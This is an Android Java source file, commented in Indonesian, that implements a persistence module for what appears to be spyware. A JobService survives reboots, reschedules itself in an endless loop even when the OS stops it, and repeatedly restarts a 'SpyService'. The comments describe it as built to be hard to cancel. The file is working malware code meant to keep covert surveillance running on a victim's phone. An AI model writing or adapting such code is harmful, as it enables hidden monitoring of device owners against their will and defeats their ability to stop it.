package com.nullx.pp;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

/**
 * JobSchedulerService — Android OS-level persistence.
 *
 * Beda dari AlarmManager: JobScheduler dikelola langsung OS,
 * lebih sulit dicancel dan bisa jalan walau Doze mode aktif
 * dengan flag setRequiresCharging(false) + setOverrideDeadline.
 *
 * Tiap job selesai → reschedule diri sendiri = loop tak henti.
 */
public class JobSchedulerService extends JobService {

    private static final int JOB_ID = 0xDEAD;

    // ── Schedule job dari luar ─────────────────────────────────────
    public static void schedule(Context ctx) {
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;

            // Kalau sudah ada job aktif → skip (jangan double)
            if (js.getPendingJob(JOB_ID) != null) return;

            JobInfo.Builder builder = new JobInfo.Builder(
                JOB_ID,
                new ComponentName(ctx, JobSchedulerService.class)
            )
            .setMinimumLatency(30_000)          // minimum 30 detik
            .setOverrideDeadline(60_000)         // paksa jalan max 60 detik
            .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
            .setPersisted(true);                 // survive reboot

            js.schedule(builder.build());
        } catch (Exception e) {}
    }

    // ── Cancel semua job (untuk cleanup) ──────────────────────────
    public static void cancel(Context ctx) {
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js != null) js.cancel(JOB_ID);
        } catch (Exception e) {}
    }

    // ── Job execution ──────────────────────────────────────────────
    @Override
    public boolean onStartJob(JobParameters params) {
        // Pastikan SpyService hidup
        restartSpyService();

        // Reschedule diri → loop
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            schedule(getApplicationContext());
            jobFinished(params, false);
        }, 1000);

        return true; // async
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        // Kalau OS cancel job → reschedule lagi
        schedule(getApplicationContext());
        return true; // retry
    }

    private void restartSpyService() {
        try {
            Intent i = new Intent(getApplicationContext(), SpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception e) {}
    }
}
